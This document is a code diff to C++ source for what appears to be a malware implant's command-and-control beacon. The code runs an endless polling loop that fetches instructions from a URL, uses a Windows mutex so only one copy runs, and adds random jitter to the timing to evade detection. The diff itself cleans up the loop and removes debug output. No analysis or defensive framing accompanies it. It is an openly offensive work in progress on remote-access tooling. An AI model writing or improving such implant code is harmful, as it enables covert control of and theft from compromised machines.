@@ -18,16 +18,11 @@ const double maxJitter = 0.3 * baseWaitTime; // 30% of base wait time
 bool isRunning = true;
 
 void beacon() {
-    while (true) {
-        // Call the beaconLogic function asynchronously and store the future object
-        std::future<void> future_result = std::async(std::launch::async, [](){
-            beaconLogic();
-        });
-
-        // Wait for the asynchronous operation to complete
-        future_result.get();
-
+    while (true) { // Run indefinitely
+        // Call the beacon function asynchronously and store the future object
+        implant::beaconLogic();
     }
+
 }
 
 std::string beaconLogic() {
@@ -40,16 +35,12 @@ std::string beaconLogic() {
         if (hMutex && GetLastError() == ERROR_ALREADY_EXISTS) {
         printf("BeaconMutex already exists, beacon already running\n");
         CloseHandle(hMutex);
-        return 0;
+        return "";
         }
     }
     while (isRunning) {
         try {
-            std::cerr << url << std::endl;
             std::string response = xhttp::http_get(url);
-            std::cerr << response << std::endl;
-            return response;
-
             std::random_device rd;
             std::mt19937 gen(rd());
             std::uniform_real_distribution<> distrib(-maxJitter, maxJitter);
@@ -64,8 +55,7 @@ std::string beaconLogic() {
         }
         catch (const std::exception& e) {
             printf("\nBeaconing error: %s\n", e.what());
-            // Try beacon again.
-            // If failed 5 times go to onFail()
+
         }
     }
     // cleanup
